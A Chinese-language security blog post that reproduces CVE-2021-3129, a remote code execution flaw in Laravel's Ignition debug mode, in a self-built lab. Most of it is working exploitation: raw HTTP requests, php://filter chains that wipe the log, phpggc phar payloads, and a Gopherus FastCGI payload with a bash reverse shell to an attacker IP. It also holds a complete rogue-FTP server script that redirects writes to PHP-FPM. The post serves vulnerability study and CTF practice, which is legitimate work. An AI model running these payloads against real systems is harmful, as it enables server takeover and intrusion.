![20210122011511.png](https://image.3001.net/images/20210301/1614564893_603c4e1d9fa2c41ae9886.png!small)

## 前言

Laravel是一套简洁、开源的PHP Web开发框架，旨在实现Web软件的MVC架构。

2021年01月12日，Laravel被披露存在一个远程代码执行漏洞（CVE-2021-3129）。当Laravel开启了Debug模式时，由于Laravel自带的Ignition
组件对file_get_contents()和file_put_contents()函数的不安全使用，攻击者可以通过发起恶意请求，构造恶意Log文件等方式触发Phar反序列化，最终造成远程代码执行。

总是感觉在未来的CTF比赛中会考到这个漏洞点，所以今天我们再来谈一谈这个漏洞。

## 搭建测试环境

> OS：`Ubuntu`
>
> PHP：`7.4.14`
>
> Laravel：`8.24.0﻿`

### 利用VulHub上已有的镜像环境（推荐）

目前CVE-2021-3129在vulhub上已有一个现成的镜像，但是镜像又拖不来。但好在vulhub还提供了一个dockerfile（位于vulhub/base/laravel/8.4.2目录下）。

dockerfile中 composer 的安装包网址是国外镜像，我们这边换成阿里的镜像源：

    
    
    FROM php:7.4-apache
    RUN set -ex \
        && apt-get update \
        && apt-get install -y --no-install-recommends unzip \
        && curl -#L -o /usr/local/bin/composer https://github.com/composer/composer/releases/download/1.10.19/composer.phar \
        && chmod +x /usr/local/bin/composer
    RUN set -ex \
        && cd /var/www \
        && rm -rf html \
        && composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/ \
        && composer create-project laravel/laravel . "v8.4.2" \
        && sed -i -E 's|"facade/ignition": ".+?"|"facade/ignition": "2.5.1"|g' composer.json \
        && composer update \
        && mv public html
    RUN set -ex \
        && chown www-data:www-data -R /var/www \
        && a2enmod rewrite

然后执行如下构建镜像并启动容器：

    
    
    docker build . -t dockerfile  
    docker run -d -p 8000:80 dockerfile

镜像在构建的时候可能会卡死，我们可以为docker build设置一个代理：

    
    
    docker build . -t dockerfile --network host --build-arg HTTP_PROXY=http://ip:port --build-arg HTTPS_PROXY=http://ip:port

### 利用GitHub上已有的镜像环境

Github上有位热心的好大哥已经搭好了一个现成的docker环境，也可以用他的：

<https://github.com/SNCKER/CVE-2021-3129>

### 手动搭建环境（可能会出问题，建议用前两种方法）

部署laravel：

    
    
    $ git clone https://github.com/laravel/laravel.git    # 下载laravel源码  
    $ cd laravel  
    $ git checkout e849812    # 切换到存在漏洞的分支  
    $ composer install        # 安装依赖  
    $ composer require facade/ignition==2.5.1    # 下载安装存在漏洞版本的组件  
    $ php artisan serve --host=0.0.0.0   # 启动服务器

搭建完成后，打开配置文件 laravel/config/app.php，找到 'debug'项设置为true（开启debug模式）：

![image-20210122002034415](https://image.3001.net/images/20210301/1614564894_603c4e1e9fd26f1176400.png!small)

此时访问`http://your-ip:8000/`，会抛出以下运行异常：No application encryption key has been
specified.（未指定应用程序的APP_KEY加密密钥）：

![image-20210121233856961](https://image.3001.net/images/20210301/1614564895_603c4e1f8a321cce5ec37.png!small)

可以看到这时候`Ignition`（Laravel
6+默认错误页面生成器）给我们提供了一个solutions，让我们在配置文件中给Laravel配置一个加密APP_KEY。

我们进入laravel根目录，将根目录里的".env.example"重命名".env"：

![image-20210121235245028](https://image.3001.net/images/20210301/1614564896_603c4e20441af47a716bd.png!small)

然后点击“Generate app key”按钮后会发送一个请求：

![image-20210121235332827](https://image.3001.net/images/20210301/1614564897_603c4e213434ec2ba8a6e.png!small)

通过这个请求（记住这个请求的样子），`Ignition`成功在配置文件.env中生成了一个key：

![image-20210122002121183](https://image.3001.net/images/20210301/1614564898_603c4e223c2ced65e2b5a.png!small)

接着刷新页面就可以正常访问了，环境也就搭建完了：

![image-20210122161527243](https://image.3001.net/images/20210301/1614564899_603c4e23271649cb45882.png!small)

## 漏洞分析

Laravel在第6版之后，debug模式使用了ignition组件来美化堆栈信息，除此之外，ignition还附带了“一键修复bug”的功能，例如：如果我们我们刚才搭建环境的时候出现的那个“未指定应用加密密钥”的报错，我们仅仅点击了“Generate
app key”这个按钮，便成功将这个bug修复了。

本次laravel这个漏洞其实就是发生在上面提到的`Ignition`（<=2.5.1）中，`Ignition`默认提供了以下几个solutions（位于/laravel/vendor/facade/ignition/src/solutions目录下）。

![image-20210122002208835](https://image.3001.net/images/20210301/1614564900_603c4e24474892641fb67.png!small)

通过这些solutions，开发者可以类似刚才那样的通过点击按钮的方式，快速修复一些错误。

本次漏洞就是其中的`vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php`中的参数过滤不严谨导致的。

首先我们到执行solution的控制器ExecuteSolutionController.php里面中去看看是如何调用solution的：

    
    
    vendor\facade\ignition\src\Http\Controllers\ExecuteSolutionController.php

![image-20210122002731153](https://image.3001.net/images/20210301/1614564901_603c4e259ced370804bc7.png!small)

先通过getRunnableSolution()方法获取到相应的solution名，然后调用solution对象中的`run()`方法，并将获取的可控的`parameters`参数传过去。通过这个点我们就可以调用到`MakeViewVariableOptionalSolution::run()`了，跟进MakeViewVariableOptionalSolution中的run()方法：

    
    
    vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php

![image-20210122004631071](https://image.3001.net/images/20210301/1614564902_603c4e26dbd82e6c0bf79.png!small)

其中，我们重点关注viewFile这个参数，代码中对它进行了如下处理：

    
    
    $contents = file_get_contents($parameters['viewFile']);  
    file_put_contents($parameters['viewFile'], $contents);

可以看到这里主要功能点是：读取一个给定的路径`$parameters['viewFile']`，并替换读取到的内容中的`$variableName`为`$variableName
?? ''`，之后写回文件中`$parameters['viewFile']`，这相当于什么都没有做！

由于这里调用了`file_get_contents()`，且其中的参数可控，所以这里可以通过`phar://`协议去触发phar反序列化。如果后期利用框架进行开发的人员写出了一个文件上传的功能，那么我们就可以上传一个恶意phar文件，利用上述的`file_get_contents()`去触发phar反序列化，达到RCE的效果。

## 漏洞检测

我们发送如下数据包，页面出现了Ignition的报错，说明漏洞存在，且开启了debug模式：

    
    
    POST /_ignition/execute-solution HTTP/1.1
    Host: 192.168.1.12:8000
    Content-Type: application/json
    Content-Length: 168
    
    {
      "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
      "parameters": {
        "variableName": "username",
        "viewFile": "xxxxxxx"
      }
    }

![image-20210122110207294](https://image.3001.net/images/20210301/1614564904_603c4e2811d4969f15703.png!small)

然后，我们按照下面的方法复现漏洞。

## Phar反序列化

下面演示一下Phar反序列化。

从phpggc里拿一条laravel中存在的拓展的链子。

    
    
    php -d'phar.readonly=0' ./phpggc monolog/rce1 call_user_func phpinfo --phar phar -o /root/phar.gif  
    或  
    php -d "phar.readonly=0" ./phpggc Laravel/RCE5 "phpinfo();" --phar phar -o /root/phar.gif

![image-20210122112223946](https://image.3001.net/images/20210301/1614564905_603c4e294f18251774a16.png!small)

假设后期利用框架进行开发的人员写出了一个文件上传的功能，那么我们就可以将这个phar文件上传上去，这里我们手动将其放入laravel的目录下，然后构造如下请求，利用上述的`file_get_contents()`去触发phar反序列化：

    
    
    POST /_ignition/execute-solution HTTP/1.1
    Host: 192.168.1.12:8000
    Content-Type: application/json
    Content-Length: 194
    
    {
      "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
      "parameters": {
        "variableName": "username",
        "viewFile": "phar:///var/www/phar.gif/test.txt"
      }
    }

如下图，成功达到了RCE的效果：

![image-20210122144241849](https://image.3001.net/images/20210301/1614564906_603c4e2a24020ac773bbf.png!small)

## 利用laravel.log实现phar反序列化

该利用方法的核心步骤是将laravel.log里的内容清空，然后利用php://filter/write=写入phar反序列化的payload，最后发送请求利用`file_get_contents()`去触发phar反序列化。

这里，在清空laravel.log的内容时，作者在文章中提出的思路是使用`php://filter`中的`convert.base64-decode`过滤器的特性，将log清空。有的人可能会想到一直convert.base64-decode，直到都为不可见字符解码清空。但是这个做法会有问题。因为base64在解码的时候如果等号后面还有内容则会报错。所以正确的做法是先用convert.iconv.utf-8.utf-16be将utf-8转为utf-16，然后再用convert.quoted-printable-encode打印所有不可见字符，然后再用convert.iconv.utf-16be.utf-8将utf-16转为utf-8，完成上述操作后laravel.log中所有字符转为不可见字符，最后convert.base64-decode即可。详情请看：<https://xz.aliyun.com/t/9030?page=1#toc-6>

将上述链条合起来就是：

    
    
    php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log

知道漏洞利用原理后，我们按照如下步骤复现漏洞。

#### 完整的漏洞利用过程

1.发送如下数据包，将原日志文件laravel.log清空：

    
    
    POST /_ignition/execute-solution HTTP/1.1
    Host: 192.168.1.12:8000
    Content-Type: application/json
    Content-Length: 328
    
    {
      "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
      "parameters": {
        "variableName": "username",
        "viewFile": "php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"
      }
    }

2.用phpggc生成phar序列化利用POC（编码后的）

    
    
    php -d "phar.readonly=0" ./phpggc Laravel/RCE5 "phpinfo();" --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex(ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"

得到的POC（编码后的）最后面再加一个a，否则最终laravel.log里面将生成两个POC，导致利用失败：

![image-20210122154407264](https://image.3001.net/images/20210301/1614564908_603c4e2c40557be260f99.png!small)

3.发送如下数据包，给Log增加一次前缀，用于对齐：

    
    
    POST /_ignition/execute-solution HTTP/1.1
    Host: 192.168.1.12:8000
    Content-Type: application/json
    Content-Length: 163
    
    {
      "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
      "parameters": {
        "variableName": "username",
        "viewFile": "AA"
      }
    }

4.将POC作为viewFile的值，发送数据包

    
    
    POST /_ignition/execute-solution HTTP/1.1
    Host: 192.168.1.12:8000
    Content-Type: application/json
    Content-Length: 5058
    
    {
      "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
      "parameters": {
        "variableName": "username",
        "viewFile": "=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=6F=00=66=00=41=00=67=00=41=00=41=00=41=00=67=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=44=00=49=00=41=00=51=00=41=00=41=00=54=00=7A=00=6F=00=30=00=4D=00=44=00=6F=00=69=00=53=00=57=00=78=00=73=00=64=00=57=00=31=00=70=00=62=00=6D=00=46=00=30=00=5A=00=56=00=78=00=43=00=63=00=6D=00=39=00=68=00=5A=00=47=00=4E=00=68=00=63=00=33=00=52=00=70=00=62=00=6D=00=64=00=63=00=55=00=47=00=56=00=75=00=5A=00=47=00=6C=00=75=00=5A=00=30=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=43=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6C=00=64=00=6D=00=56=00=75=00=64=00=48=00=4D=00=69=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=56=00=7A=00=58=00=45=00=52=00=70=00=63=00=33=00=42=00=68=00=64=00=47=00=4E=00=6F=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=59=00=36=00=49=00=67=00=41=00=71=00=41=00=48=00=46=00=31=00=5A=00=58=00=56=00=6C=00=55=00=6D=00=56=00=7A=00=62=00=32=00=78=00=32=00=5A=00=58=00=49=00=69=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=30=00=38=00=36=00=4D=00=6A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=54=00=47=00=39=00=68=00=5A=00=47=00=56=00=79=00=58=00=45=00=56=00=32=00=59=00=57=00=78=00=4D=00=62=00=32=00=46=00=6B=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=41=00=36=00=65=00=33=00=31=00=70=00=4F=00=6A=00=45=00=37=00=63=00=7A=00=6F=00=30=00=4F=00=69=00=4A=00=73=00=62=00=32=00=46=00=6B=00=49=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=5A=00=58=00=5A=00=6C=00=62=00=6E=00=51=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=67=00=36=00=49=00=6B=00=6C=00=73=00=62=00=48=00=56=00=74=00=61=00=57=00=35=00=68=00=64=00=47=00=56=00=63=00=51=00=6E=00=4A=00=76=00=59=00=57=00=52=00=6A=00=59=00=58=00=4E=00=30=00=61=00=57=00=35=00=6E=00=58=00=45=00=4A=00=79=00=62=00=32=00=46=00=6B=00=59=00=32=00=46=00=7A=00=64=00=45=00=56=00=32=00=5A=00=57=00=35=00=30=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=45=00=77=00=4F=00=69=00=4A=00=6A=00=62=00=32=00=35=00=75=00=5A=00=57=00=4E=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=4D=00=79=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=4E=00=72=00=5A=00=58=00=4A=00=35=00=58=00=45=00=64=00=6C=00=62=00=6D=00=56=00=79=00=59=00=58=00=52=00=76=00=63=00=6C=00=78=00=4E=00=62=00=32=00=4E=00=72=00=52=00=47=00=56=00=6D=00=61=00=57=00=35=00=70=00=64=00=47=00=6C=00=76=00=62=00=69=00=49=00=36=00=4D=00=6A=00=70=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=6A=00=62=00=32=00=35=00=6D=00=61=00=57=00=63=00=69=00=4F=00=30=00=38=00=36=00=4D=00=7A=00=55=00=36=00=49=00=6B=00=31=00=76=00=59=00=32=00=74=00=6C=00=63=00=6E=00=6C=00=63=00=52=00=32=00=56=00=75=00=5A=00=58=00=4A=00=68=00=64=00=47=00=39=00=79=00=58=00=45=00=31=00=76=00=59=00=32=00=74=00=44=00=62=00=32=00=35=00=6D=00=61=00=57=00=64=00=31=00=63=00=6D=00=46=00=30=00=61=00=57=00=39=00=75=00=49=00=6A=00=6F=00=78=00=4F=00=6E=00=74=00=7A=00=4F=00=6A=00=63=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=35=00=68=00=62=00=57=00=55=00=69=00=4F=00=33=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=59=00=57=00=4A=00=6A=00=5A=00=47=00=56=00=6D=00=5A=00=79=00=49=00=37=00=66=00=58=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=32=00=39=00=6B=00=5A=00=53=00=49=00=37=00=63=00=7A=00=6F=00=79=00=4E=00=54=00=6F=00=69=00=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=63=00=47=00=68=00=77=00=61=00=57=00=35=00=6D=00=62=00=79=00=67=00=70=00=4F=00=79=00=42=00=6C=00=65=00=47=00=6C=00=30=00=4F=00=79=00=41=00=2F=00=50=00=69=00=49=00=37=00=66=00=58=00=31=00=39=00=42=00=51=00=41=00=41=00=41=00=47=00=52=00=31=00=62=00=57=00=31=00=35=00=42=00=41=00=41=00=41=00=41=00=4C=00=71=00=2F=00=42=00=57=00=41=00=45=00=41=00=41=00=41=00=41=00=44=00=48=00=35=00=2F=00=32=00=4C=00=59=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=43=00=41=00=41=00=41=00=41=00=48=00=52=00=6C=00=63=00=33=00=51=00=75=00=64=00=48=00=68=00=30=00=42=00=41=00=41=00=41=00=41=00=4C=00=71=00=2F=00=42=00=57=00=41=00=45=00=41=00=41=00=41=00=41=00=44=00=48=00=35=00=2F=00=32=00=4C=00=59=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=64=00=47=00=56=00=7A=00=64=00=48=00=52=00=6C=00=63=00=33=00=52=00=64=00=30=00=6B=00=2F=00=31=00=70=00=52=00=49=00=71=00=57=00=72=00=36=00=77=00=46=00=6C=00=38=00=30=00=4D=00=2B=00=48=00=4B=00=2B=00=57=00=61=00=63=00=4E=00=67=00=49=00=41=00=41=00=41=00=42=00=48=00=51=00=6B=00=31=00=43=00a"
      }
    }

5.发送如下数据包，清空对log文件中的干扰字符，只留下POC：

    
    
    POST /_ignition/execute-solution HTTP/1.1
    Host: 192.168.1.12:8000
    Content-Type: application/json
    Content-Length: 299
    
    {
      "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
      "parameters": {
        "variableName": "username",
        "viewFile": "php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"
      }
    }

这一步可能会出现异常，导致无法正确清理Log文件。如果出现这种状况，可以重新从第一步开始尝试。

6.使用`phar://`进行反序列化，执行任意代码（此时需要使用绝对路径）：

    
    
    POST /_ignition/execute-solution HTTP/1.1
    Host: 192.168.1.12:8000
    Content-Type: application/json
    Content-Length: 210
    
    {
      "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
      "parameters": {
        "variableName": "username",
        "viewFile": "phar:///var/www/storage/logs/laravel.log/test.txt"
      }
    }

如下图所示，PHPINFO已成功执行：

![image-20210122153809273](https://image.3001.net/images/20210301/1614564909_603c4e2d76f076930d101.png!small)

漏洞利用成功。

## 利用FTP攻击PHP-FPM

由于我们可以运行file_get_contents来查找任何东西，因此，可以运用SSRF常用的姿势，通过发送HTTP请求来扫描常用端口。假设此时我们发现目标正在监听9000端口，则很有可能目标主机上正在运行着PHP-FPM，我们可以进一步利用该漏洞来攻击PHP-FPM。

众所周知，如果我们能向PHP-FPM服务发送一个任意的二进制数据包，就可以在机器上执行代码。这种技术经常与gopher://协议结合使用，curl支持gopher://协议，但file_get_contents却不支持。

另一个已知的允许通过TCP发送二进制数据包的协议是FTP，更准确的说是该协议的被动模式，即：如果一个客户端试图从FTP服务器上读取一个文件（或写入），服务器会通知客户端将文件的内容读取（或写）到一个特定的IP和端口上。而且，这里对这些IP和端口没有进行必要的限制。例如，服务器可以告诉客户端连接到自己的某一个端口，如果它愿意的话。

现在，由于该laravel漏洞中file_get_contents()和file_put_contents()这两个函数在作祟，如果我们尝试使用`viewFile=ftp://evil-server/file.txt`来利用这个漏洞，会发生以下情况：

> file_get_contents()连接到我们的FTP服务器，并下载file.txt。
>
> file_put_contents()连接到我们的FTP服务器，并将其上传回file.txt。

现在，你可能已经知道这是怎么回事：我们将使用FTP协议的被动模式让file_get_contents()在我们的服务器上下载一个文件，当它试图使用file_put_contents()把它上传回去时，我们将告诉它把文件发送到127.0.0.1:9000。

这样，我们就可以向目标主机本地的PHP-FPM发送一个任意的数据包，从而执行代码，造成SSRF。

下面我们来演示一下攻击过程。

首先，我们使用gopherus生成攻击fastcgi的payload：

    
    
    python gopherus.py --exploit fastcgi
    /var/www/public/index.php  # 这里输入的是目标主机上一个已知存在的php文件
    bash -c "bash -i >& /dev/tcp/192.168.1.7/2333 0>&1"  # 这里输入的是要执行的命令

![image-20210122173720357](https://image.3001.net/images/20210301/1614564911_603c4e2f143a9b886b629.png!small)

得到payload，而我们需要的是上面payload中`_`后面的数据部分，即：

    
    
    %01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%07%07%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH103%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%19SCRIPT_FILENAME/var/www/public/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00g%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.1.7/2333%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00

在攻击机上设置好监听：

![image-20210122173748047](https://image.3001.net/images/20210301/1614564913_603c4e31b5297238d9c24.png!small)

然后编写如下脚本（脚本是从网上扒的，谁叫我菜呢，大佬勿喷~~），在攻击机上搭建一个恶意的ftp服务，并将上面的paylaod中的数据替换掉下面ftp脚本中的payload的内容：

    
    
    # -*- coding: utf-8 -*-    # @Time    : 2021/1/13 6:56 下午
    # @Author  : tntaxin
    # @File    : ftp_redirect.py
    # @Software:
    
    import socket
    from urllib.parse import unquote
    
    # 对gopherus生成的payload进行一次urldecode
    payload = unquote("%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%07%07%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH103%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%19SCRIPT_FILENAME/var/www/public/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00g%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.1.7/2333%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00")
    payload = payload.encode('utf-8')
    
    host = '0.0.0.0'
    port = 23
    sk = socket.socket()
    sk.bind((host, port))
    sk.listen(5)
    
    # ftp被动模式的passvie port,监听到1234
    sk2 = socket.socket()
    sk2.bind((host, 1234))
    sk2.listen()
    
    # 计数器，用于区分是第几次ftp连接
    count = 1
    while 1:
        conn, address = sk.accept()
        conn.send(b"200 \n")
        print(conn.recv(20))  # USER aaa\r\n  客户端传来用户名
        if count == 1:
            conn.send(b"220 ready\n")
        else:
            conn.send(b"200 ready\n")
    
        print(conn.recv(20))   # TYPE I\r\n  客户端告诉服务端以什么格式传输数据，TYPE I表示二进制， TYPE A表示文本
        if count == 1:
            conn.send(b"215 \n")
        else:
            conn.send(b"200 \n")
    
        print(conn.recv(20))  # SIZE /123\r\n  客户端询问文件/123的大小
        if count == 1:
            conn.send(b"213 3 \n")  
        else:
            conn.send(b"300 \n")
    
        print(conn.recv(20))  # EPSV\r\n'
        conn.send(b"200 \n")
    
        print(conn.recv(20))   # PASV\r\n  客户端告诉服务端进入被动连接模式
        if count == 1:
            conn.send(b"227 127,0,0,1,4,210\n")  # 服务端告诉客户端需要到哪个ip:port去获取数据,ip,port都是用逗号隔开，其中端口的计算规则为：4*256+210=1234
        else:
            conn.send(b"227 127,0,0,1,35,40\n")  # 端口计算规则：35*256+40=9000
    
        print(conn.recv(20))  # 第一次连接会收到命令RETR /123\r\n，第二次连接会收到STOR /123\r\n
        if count == 1:
            conn.send(b"125 \n") # 告诉客户端可以开始数据链接了
            # 新建一个socket给服务端返回我们的payload
            print("建立连接!")
            conn2, address2 = sk2.accept()
            conn2.send(payload)
            conn2.close()
            print("断开连接!")
        else:
            conn.send(b"150 \n")
            print(conn.recv(20))
            exit()
    
        # 第一次连接是下载文件，需要告诉客户端下载已经结束
        if count == 1:
            conn.send(b"226 \n")
        conn.close()
        count += 1

运行上述脚本，一个恶意ftp服务就起来了：

![image-20210122171001557](https://image.3001.net/images/20210301/1614564916_603c4e343ce9f4c307c40.png!small)

这个脚本做的事情很简单，就是当客户端第一次连接的时候返回我们预设的payload；当客户端第二次连接的时候将客户端的连接重定向到127.0.0.1:9000，也就是目标主机上php-fpm服务的端口，从而造成SSRF，攻击其php-fpm。

最后，构造如下请求，触发攻击：

    
    
    POST /_ignition/execute-solution HTTP/1.1
    Host: 192.168.1.12:8000
    Content-Type: application/json
    Content-Length: 189
    
    {
      "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
      "parameters": {
        "variableName": "username",
        "viewFile": "ftp://aaa@192.168.1.7:23/123"
      }
    }

如下，vps上成功得到目标主机的shell：

![image-20210122173854294](https://image.3001.net/images/20210301/1614564917_603c4e3561fec39467801.png!small)

## Ending......

![](https://image.3001.net/images/20210301/1614566399_603c53ffd48c0d3d559f6.jpg!small)

我的博客：[https://whoamianony.top/﻿](https://whoamianony.top/)

> 参考：
>
> <https://www.ambionics.io/blog/laravel-debug-rce>
>
> <https://xz.aliyun.com/t/9030?page=1#toc-7>
>
> <https://www.freebuf.com/articles/web/261469.html>
>
>
> [https://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==∣=2247499853&idx=1&sn=225ce332407f61a2181b636e86545dab&chksm=](https://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247499853&idx=1&sn=225ce332407f61a2181b636e86545dab&chksm=)
>
> <https://www.anquanke.com/post/id/226750#h2-0>

